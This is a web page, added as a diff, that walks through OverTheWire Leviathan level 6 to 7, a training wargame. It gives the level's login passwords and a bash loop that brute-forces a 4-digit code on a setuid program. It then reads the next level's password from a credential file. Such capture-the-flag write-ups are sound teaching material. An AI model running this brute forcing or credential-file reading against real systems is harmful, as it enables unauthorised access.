@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OTW Leviathan 6 &#8594; 7 @ Shukularuni</title>
+    <link rel="stylesheet" href="/style.css">
+    <link rel="icon" type="image/x-icon" href="/icon.png">
+</head>
+<body>
+    <header>
+        <h1>OverTheWire Leviathan Guide</h1>
+        <p>here's how to solve the leviathan level 6 &#8594; 7</p>
+    </header>
+    <main>
+        <section>
+            <a href="./">Back to the Leviathan Guides</a>
+            <p>Previous Level Guide: <a href="6.html">Bandit Level 5 &#8594; 6</a></p>
+            <hr>
+            <h2>Access</h2>
+            <p>SSH: <code>ssh leviathan6@leviathan.labs.overthewire.org -p 2223</code></p>
+            <p>Password: <code>AL5Hmapwi1</code></p>
+            <h2>Info</h2>
+            <pre>Description: There is no information for this level, intentionally.</pre>
+            <h2>Theory</h2>
+            <p>Not much to do with the details from the task, so just skipping to doing it.</p>
+            <h2>Solution</h2>
+            <p>First of all, we will use ls -la to see all files regardless they are hidden and some details of the files/folders:</p>
+            <pre>~$ ls -la
+total 36
+drwxr-xr-x  2 root       root        4096 Sep 19 07:07 .
+drwxr-xr-x 83 root       root        4096 Sep 19 07:09 ..
+-rw-r--r--  1 root       root         220 Mar 31  2024 .bash_logout
+-rw-r--r--  1 root       root        3771 Mar 31  2024 .bashrc
+-r-sr-x---  1 leviathan7 leviathan6 15032 Sep 19 07:07 leviathan6
+-rw-r--r--  1 root       root         807 Mar 31  2024 .profile</pre>
+            <p>Let's check out this leviathan6 file as it is the only file here:</p>
+            <pre>~$ ./leviathan6
+usage: /home/leviathan6/leviathan6 &lt;4 digit code&gt;</pre>
+            <p>So it seems like the program is one of those small versions of the next level's terminal, but to enter, we need a 4-digit code, and it seems like there's nothing that could give us a hint to what it could be, so that brings us to brute forcing it, basically it's entering every single password possible until one works, but typing ten thousand numbers by hand is pretty hard, so we'll do a temporary directory to write some code to do this brute force stuff:</p>
+            <pre>~$ mktemp -d
+/tmp/tmp.zB1xrHuD9y
+
+~$ cd /tmp/tmp.zB1xrHuD9y
+
+/tmp/tmp.zB1xrHuD9y$ vim bruteforce.sh</pre>
+            <p>I'm using vim because nano was glitching a bit. Basically we're going to loop through all the numbers from 0000 to 9999, but also using echo to know what number it is. Then after putting this code just use :wq to save and close:</p>
+            <pre>for a in {0000..9999}
+do
+echo $a
+~/leviathan6 $a
+done</pre>
+            <p>Now we're going to give it a couple more permissions to access the executable file:</p>
+            <pre>/tmp/tmp.zB1xrHuD9y$ ls
+bruteforce.sh
+
+/tmp/tmp.zB1xrHuD9y$ chmod +x bruteforce.sh
+
+/tmp/tmp.zB1xrHuD9y$ ./bruteforce.sh
+0000
+Wrong
+0001
+Wrong
+0002
+Wrong
+0003
+Wrong
+...</pre>
+            <p>Now just wait a couple seconds until you get the $ symbol where you can get the password from the next level, but I will just exit in here to clear my terminal of 20000 lines of numbers and wrongs, the number is the one before the $ symbol like in here:</p>
+            <pre>...
+Wrong
+7122
+Wrong
+7123
+$ exit
+7124
+Wrong
+...</pre>
+            <p>Now that I've cleared my terminal we can just re-enter into the small next level terminal by just looking at the number on top of the small terminal dollar symbol, like this:</p>
+            <pre>/tmp/tmp.zB1xrHuD9y$ ~/leviathan6 7123
+$ whoami
+leviathan7</pre>
+            <p>So just like past levels, we'll grab the password from this little thing:</p>
+            <pre>$ cat /etc/leviathan_pass/leviathan7
+uTRobztpgO</pre>
+            <p>And that's our password! Now you can exit twice because you are inside the small next level terminal, and then go to the next level.</p>
+            <a target="_blank" href="https://overthewire.org/wargames/leviathan/leviathan7.html">https://overthewire.org/wargames/leviathan/leviathan7.html</a>
+            <hr>
+            Next Level Guide: <a href="8.html">Leviathan Level 7 &#8594; Level 8</a>
+        </section>
+        <section class="link-list">
+            <h2>Explore My Website</h2>
+            <ul>
+                <li><a href="/">Home</a></li>
+                <li><a href="/search.html">Search</a></li>
+                <li><a href="/articles.html">Articles</a></li>
+                <li><a href="/guides.html">Guides</a></li>
+            </ul>
+            <br><br><br>
+        </section>
+    </main>
+    <footer>
+        <p class="cute">Made with ❤️ by Shukularuni</p>
+    </footer>
+</body>
+</html>
